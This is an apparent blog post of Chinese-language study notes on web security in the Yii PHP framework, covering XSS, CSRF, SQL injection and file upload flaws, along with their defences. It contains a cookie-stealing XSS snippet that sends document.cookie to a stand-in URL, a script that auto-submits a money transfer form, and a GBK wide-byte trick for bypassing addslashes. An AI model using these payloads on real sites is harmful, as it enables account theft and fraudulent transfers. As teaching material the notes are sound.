---
title: Yii 框架之安全篇
date: 2016-10-29 21:05:35
tags: Yii
category: PHP
---


## XSS 攻击和防范之存储

XSS 全称

XSS 概念

XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到
提供给其它用户使用的页面中，从而对用户进行攻击

### 如何使用 XSS 攻击盗取用户账号
```
var cookie = document.cookie;
window.location.href = "http://127.0.0.1/index.php?cookie="+cookie;
```

- 问题如下：document.cookie 获取得到的 cookie 是什么样的
- index.php 是如何处理 cookie 值的
- 有了 cookie 怎么就能进行盗取账号的

httponly 阻止 js 读取 cookie

哪一段 js 代码能够自动转账
```
document.getElementById('ipt-search-key').value='withyz@xx.com';
document.getElementById('amount').value='100';
document.getElementById('reason').value='劫富济贫';
document.getElementsByClassName('ui-button-text')[0].click();
```
如何把 js 注入到转账页面中


## XSS 攻击和防范之反射

现代现浏览器(chrome)对于反射型XSS有一定防护
手动关闭：\Yii::$app->response->headers->add('X-XSS-Protection', '0');

HTML 实体编码
URL 编码

## XSS 攻击和防范之蠕虫

### Yii 如何防范 XSS

转码防范
\yii\helpers\Html::encode($script);

过滤防范
\yii\helpers\HtmlPurifier::process($js);

## CSRF 攻击和防范

跨站请求伪造

get型的crtf攻击
构造url, 诱使用户点击

透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

yii 框架 csrf token 验证过程

检查Referer字段
HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。
这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。
添加校验token
由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。


## SQL 注入和防范

addslashes() 转义函数 防范 SQL 注入

Sql注入：将要执行的sql语句采用拼接的方式组装时，就sql注入的可能；
原本要查询的字符串在拼接后发生发“越狱”，部分字符串被数据库识别成可执行语句，
导致意外的操作和查询结果
防范：1，屏蔽关键字和敏感词，有影响业务逻辑的可能；
2， 对传入变量转义，避免变量的内容越狱

绕过转义：
char(0xdf)/',在utf-8下会变成β/',
而在gbk下由于汉字是2个字节组成；在数据中将变成 運',单引号逃过了被转义

使用PDO统一数据库接口，可以无痛切换；
使用占位符防范SQL注入


## 文件上传漏洞

文件上传漏洞
如果后台对文件上传审查不严，导致php代码上传后被执行，可进行遍历文件等操作使源码泄露

用 fiddler 可以拦截请求,然后修改请求的内容,比如图片中的文件名,修改成如上形式后,会生成一个php文件,然后在上传后的目录执行php文件会造成危害

保存上传过来的文件名的时候不要用用户本来的名称,容易在中途被非法修改,从而变成.php这些可执行文件,造成损害
